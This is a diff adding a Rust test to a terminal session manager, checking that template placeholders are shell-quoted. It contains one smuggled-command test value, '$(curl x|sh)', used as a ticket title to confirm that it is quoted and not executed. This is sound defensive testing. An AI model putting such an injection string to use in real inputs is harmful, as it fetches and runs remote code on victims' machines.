@@ -180,6 +180,30 @@ async fn template_spawns_a_tab_with_claude_hooks() {
 }
 
 #[tokio::test]
+async fn template_shell_command_quotes_placeholders() {
+    let tmp = tempfile::tempdir().unwrap();
+    let mut settings = Settings::defaults();
+    settings.session_templates.push(kelta_proto::settings::SessionTemplate {
+        id: "log".into(),
+        label: "Log".into(),
+        layout: kelta_proto::settings::TemplateNode::Session {
+            session: "shell".into(),
+            name: None,
+            profile: None,
+            command: Some("git log --grep {ticket.title} {base|shell}".into()),
+        },
+        enabled: true,
+    });
+    let h = start(tmp.path(), settings, vec![project("shop", tmp.path())]);
+    let shop = ProjectId::new("shop");
+    // a third-party ticket title must not run as shell code
+    let ctx = TemplateCtx { extra: map(&[("title", "$(curl x|sh)")]), ..TemplateCtx::default() };
+    let spawned = h.core.session_spawn_template(&shop, "log", ctx, Placement::NewTab).await.unwrap();
+    let typed = String::from_utf8(h.term.written(&spawned[0].id)).unwrap();
+    assert_eq!(typed, "git log --grep '$(curl x|sh)' 'main'\r");
+}
+
+#[tokio::test]
 async fn spawn_uses_the_requested_id_once() {
     let tmp = tempfile::tempdir().unwrap();
     let h = start(tmp.path(), Settings::defaults(), vec![project("shop", tmp.path())]);
